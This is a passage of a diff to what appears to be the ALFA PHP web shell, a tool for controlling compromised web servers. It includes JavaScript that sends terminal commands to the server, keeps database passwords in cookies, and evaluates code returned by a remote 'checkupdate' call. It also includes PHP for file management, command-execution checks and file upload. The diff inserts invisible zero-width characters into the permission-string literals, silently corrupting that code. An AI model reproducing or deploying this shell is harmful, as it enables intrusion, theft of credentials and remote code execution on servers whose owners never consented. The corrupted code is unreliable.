0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=alfaGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("alfa-terminal-history","",2012)}function alfaAceToFullscreen(e){var t=e.getAttribute("ace_id");alfa_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return alfa_ace_editors.eval[t].getValue()}function alfaOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+alfab64("open_archive_dir")+"&c="+alfab64(c_)+"&alfa1="+alfab64(t)+"&alfa2="+alfab64(i)+"&ajax="+alfab64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="alfaOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function alfaDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),alfaConnectionHistoryUpdate(e)}function alfaConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function alfaShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'alfaConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'alfaDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function alfaConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("alfa_connection_hist",btoa(JSON.stringify(a)),2012)}function alfaExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");alfaloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+alfab64("terminalExec")+"&c="+alfab64(l)+"&alfa1="+alfab64(a)+"&ajax="+alfab64("true");if(_Ajax(d.URL,r,function(e,t){alfaloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),alfaShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&alfaUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=alfaGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("alfa-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+alfa_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function alfaColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function alfagetFlags(){data="a="+alfab64("get_flags")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="http://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="http://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function alfaCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(alfa_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}else g("FilesMan","<?php echo $GLOBALS["cwd"]; ?>"),editorClose("editor"),editorClose("options_window"),editorClose("cgiloader")}function alfaFmngrContextRow(){d.querySelectorAll(".fmanager-row a.main_name").forEach(function(e){e.addEventListener("contextmenu",function(e){var t=e.target,a="";if(".."==(a="A"==e.target.parentElement.tagName?(t=e.target.parentElement).getAttribute("fname"):t.getAttribute("fname")))return!1;var i=t.getAttribute("id"),l=t.getAttribute("path"),r=t.getAttribute("ftype"),o=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete"];for(var n in"file"!=r||isArchive(a)?o[3]="view_archive":o.splice(11,1),"folder"==r&&(o=["newtab","link","move","copy","rename","modify","permission","compress","delete"]),alfaSortMenuItems(o),o){var s=d.querySelector("#rightclick_menu > a[name="+o[n]+"]");switch(s.setAttribute("fid",i),s.setAttribute("fname",decodeURIComponent(a)),s.setAttribute("path",l),s.setAttribute("ftype",r),o[n]){case"view":case"edit":var c="auto";"edit"==o[n]&&(c="edit"),s.setAttribute("href","#action=fileman&path="+c_+"/&file="+a),s.setAttribute("onclick","editor('"+a+"','"+c+"','','','','file')");break;case"newtab":var u=a;"file"==r?(u="&file="+a,s.setAttribute("href","#action=fileman&path="+c_+"/"+u),s.setAttribute("target","_blank"),s.onclick=function(){}):(s.setAttribute("href","javascript:void(0)"),s.removeAttribute("target"),s.onclick=function(){alfaFilesManNewTab(c_,u)});break;case"delete":s.setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';");break;case"download":s.setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')");break;case"permission":try{var p=d.querySelector("#id_chmode_"+i.replace("id_","")+" span").innerHTML;s.setAttribute("perm",p.trim())}catch(e){}break;case"link":s.style.display="block";var f="<?php echo $_SERVER["DOCUMENT_ROOT"]; ?>/",m=(c_+"/"+a).replace(/\/\//g,"/");if(-1!=m.indexOf(f)){f=m.replace(f,"");var b=location.origin+"/"+f;s.setAttribute("href",""+b)}else s.style.display="none"}}var y=e.clientX,_=e.clientY;alfaRightClickMenu(y,_),e.preventDefault()})})}function alfaFilesManNewTab(e,t,a){var i=t;void 0!==a&&(i=alfaGetLastFolderName(e));var l=decodeURIComponent(e+"/"+t);l=l.replace(/\/\//g,"/");var r=$("filesman_tab_1"),o=r.getAttribute("fm_counter");o=parseInt(o)+1,r.setAttribute("fm_counter",o),d.querySelector("#filesman_tabs_child").insertAdjacentHTML("beforeend",'<div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" path="'+l+'" id="filesman_tab_'+o+'" fm_id="'+o+'" onclick="filesmanTabController(this);" fname="'+t+'" class="filesman_tab"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span class="filesman-tab-folder-name">'+i+'</span> <img fm_id="'+o+'" onclick="closeFmTab(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector(".ajaxarea").insertAdjacentHTML("beforebegin",'<div style="position:relative;" fm_id="'+o+'" id="filesman_holder_'+o+'" class="ajaxarea"><div class="header"></div></div>'),alfa_fm_id=o,g("FilesMan",l),alfa_fm_id=0}function alfaFilesmanTabShowTitle(e,t){t.stopPropagation();var a=$("filesman-tab-full-path");a.style.display="block",a.style.top=e.offsetTop-37+"px",a.style.left=e.offsetLeft-$("filesman_tabs").scrollLeft+"px",a.innerHTML=e.getAttribute("path")}function alfaFilesmanTabHideTitle(e,t){$("filesman-tab-full-path").style.display="none"}function alfaPopupAction(e,t){var a="",i="";switch(t){case"rename":a="Old file name:",i="New file name:";break;case"copy":a="File path:",i="Enter the file path that you want to copy this file to:";break;case"move":a="Current Path:",i="Enter the file path that you want to move this file to:";break;case"extract":a="Files to extract:",i="Enter the path you wish to extract the files to and click Extract:"}var l=e.getAttribute("fname"),r=e.getAttribute("path"),o=t.charAt(0).toUpperCase()+t.slice(1);if("permission"==t){d.querySelector("#shortcutMenu-holder").style.height="222px",o="Change Permissions",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="block",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="none";var n=e.getAttribute("perm"),s=n.substr(1,1),c=n.substr(2,1),u=n.substr(3,1);d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s,d.querySelector("#shortcutMenu-holder > form input[name=g]").value=c,d.querySelector("#shortcutMenu-holder > form input[name=w]").value=u,autoCheckPerms(s,"u",["u","g","w"]),autoCheckPerms(c,"g"),autoCheckPerms(u,"w")}else d.querySelector("#shortcutMenu-holder").style.height="190px",d.querySelector("#shortcutMenu-holder > form > input[name=fname]").style.display="block",d.querySelector("#shortcutMenu-holder > form > .perm-table-holder").style.display="none";var p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+alfa_current_fm_id;alfaloader(o,"block"),data="a="+alfab64(e)+"&c="+alfab64(t)+"&alfa1="+alfab64(a)+"&alfa2="+alfab64(i)+"&alfa3="+alfab64(l)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,r,!1,o)}function alfaPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),alfaShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification("error...!","Rename Action","error");alfaloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){alfaloader(t,"none"),alfaShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,alfaShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else alfaShowNotification(t,"Modify Action","error");alfaloader(a,"none")})}}function alfaInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+alfab64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("alfa-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("alfa_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.alfa_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+alfab64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+alfab64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&alfaCheckUrlHash()},alfaCheckUrlHash(),alfagetFlags(),rightclick_menu_context=$("rightclick_menu").style,alfaInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);var e=document.createElement("script");e.src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.10.2/Sortable.min.js",e.id="sortable-plugin",e.onload=function(){alfaInitSoratableTab($("filesman_tabs_child")),alfaInitSoratableTab(d.querySelector(".editor-tabs")),alfaInitSoratableTab(d.querySelector(".options_tab")),alfaInitSoratableTab(d.querySelector(".terminal-tabs")),alfaInitSoratableTab(d.querySelector(".sql-tabs"))},d.body.appendChild(e)}();
 </script>
 </body>
 </html>
-";
+<?php
 }}
 if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
 function posix_getpwuid($p) {return false;} }
@@ -2887,23 +2417,23 @@ else
 return $s . ' B';
 }
 function alfaPerms($p) {
-if (($p & 0xC000) == 0xC000)$i = 's';
-elseif (($p & 0xA000) == 0xA000)$i = 'l';
-elseif (($p & 0x8000) == 0x8000)$i = '-';
-elseif (($p & 0x6000) == 0x6000)$i = 'b';
-elseif (($p & 0x4000) == 0x4000)$i = 'd';
-elseif (($p & 0x2000) == 0x2000)$i = 'c';
-elseif (($p & 0x1000) == 0x1000)$i = 'p';
-else $i = 'u';
-$i .= (($p & 0x0100) ? 'r' : '-');
-$i .= (($p & 0x0080) ? 'w' : '-');
-$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
-$i .= (($p & 0x0020) ? 'r' : '-');
-$i .= (($p & 0x0010) ? 'w' : '-');
-$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
-$i .= (($p & 0x0004) ? 'r' : '-');
-$i .= (($p & 0x0002) ? 'w' : '-');
-$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
+if (($p & 0xC000) == 0xC000)$i = 's​';
+elseif (($p & 0xA000) == 0xA000)$i = 'l​';
+elseif (($p & 0x8000) == 0x8000)$i = '-​';
+elseif (($p & 0x6000) == 0x6000)$i = 'b​';
+elseif (($p & 0x4000) == 0x4000)$i = 'd​';
+elseif (($p & 0x2000) == 0x2000)$i = 'c​';
+elseif (($p & 0x1000) == 0x1000)$i = 'p​';
+else $i = 'u​';
+$i .= (($p & 0x0100) ? 'r​' : '-');
+$i .= (($p & 0x0080) ? 'w​' : '-');
+$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's​' : 'x​' ) : (($p & 0x0800) ? 'S​' : '-'));
+$i .= (($p & 0x0020) ? 'r​' : '-');
+$i .= (($p & 0x0010) ? 'w​' : '-');
+$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's​' : 'x​' ) : (($p & 0x0400) ? 'S​' : '-'));
+$i .= (($p & 0x0004) ? 'r​' : '-');
+$i .= (($p & 0x0002) ? 'w​' : '-');
+$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't​' : 'x​' ) : (($p & 0x0200) ? 'T​' : '-'));
 return $i;
 }
 function alfaPermsColor($f,$isbash=false){
@@ -2946,11 +2476,11 @@ $file_ary[$i][$key] = $file_post[$key][$i];
 return $file_ary;
 }
 function _alfa_can_runCommand($cgi=true,$cache=true){
-	if(isset($_SESSION["alfa_canruncmd"])&&$cache){
+	if(isset($_COOKIE["alfa_canruncmd"])&&$cache){
 		return true;
 	}
 	if(strlen(alfaEx("whoami",false,$cgi))>0){
-		$_SESSION["alfa_canruncmd"] = true;
+		$_COOKIE["alfa_canruncmd"] = true;
 		return true;
 	}
 	return false;
@@ -3008,6 +2538,9 @@ function _alfa_is_writable($file){
 function _alfa_is_dir($dir,$mode="-d"){
 	$check = false;
 	$check = @is_dir($dir);
+	if($mode == "-e"){
+		$check = @is_file($dir);
+	}
 	if(!$check){
 		if(_alfa_can_runCommand()){
 			$check = alfaEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
@@ -3020,38 +2553,98 @@ function _alfa_is_dir($dir,$mode="-d"){
 	}
 	return $check;
 }
+function _alfa_load_ace_options($base){
+	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'theme\');"><option value="terminal" selected>terminal</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="gruvbox">gruvbox</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$base.'" onChange="alfaAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="alfaAceChangeWrapMode(this,\''.$base.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="alfaAceChangeFontSize(\''.$base.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="alfaAceChangeFontSize(\''.$base.'\', \'-\', this);return false;">-</button> | ';
+}
+function alfaFilesMan2(){
+	alfahead();
+	AlfaNum(8,9,10,7,6,5,4);
+	echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
+	alfaFooter();
+}
+function copy_paste($c,$s,$d){
+if(@is_dir($c.$s)){
+@mkdir($d.$s);
+$h = @opendir($c.$s);
+while (($f = @readdir($h)) !== false)
+if (($f != ".") and ($f != ".."))
+copy_paste($c.$s.'/',$f, $d.$s.'/');
+} elseif(is_file($c.$s))
+@copy($c.$s, $d.$s);
+}
 function alfaFilesMan(){
-alfahead();
-AlfaNum(8,9,10,7,6,5,4);
-echo '<div class="ajaxarea"><div class="header">';
-if(!empty ($_COOKIE['f']))
-$_COOKIE['f'] = @unserialize($_COOKIE['f']);
+if(!empty ($_COOKIE['alfa_f']))
+$_COOKIE['alfa_f'] = @unserialize($_COOKIE['alfa_f']);
 if(!empty($_POST['alfa1'])){
 switch($_POST['alfa1']){
 case 'uploadFile':
-if(isset($GLOBALS['glob_chdir_false'])){
+$move_cmd_file = false;
+$alfa_canruncmd = false;
+if($GLOBALS['glob_chdir_false']){
 	$alfa_canruncmd = _alfa_can_runCommand(true,true);
 	$move_cmd_file = true;
 }
+if(_alfa_is_writable($GLOBALS['cwd'])){
 $files = reArrayFiles($_FILES['f']);
+$ret_files = array();
 foreach($files as $file){
-if($move_cmd_file){
+if($move_cmd_file&&$alfa_canruncmd){
 	alfaEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
 }else{
-	@move_uploaded_file($file['tmp_name'],$file['name']);
+	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
+		$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($file['name'])):array("name" => "????");
+		$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($file['name'])):array("name" => "????");
+		$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($file['name']):"????");
+		$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($file['name']):"????");
+		$file_modify = @date('Y-m-d H:i:s', @filemtime($file['name']));
+		$file_perm = alfaPermsColor($file['name']);
+		$file_size = @filesize($file['name']);
+		$ret_files[] = array("name" => $file['name'], "size" => alfaSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
+	}
 }
-echo "uped...!<Br>";
+}
+if(!$move_cmd_file){
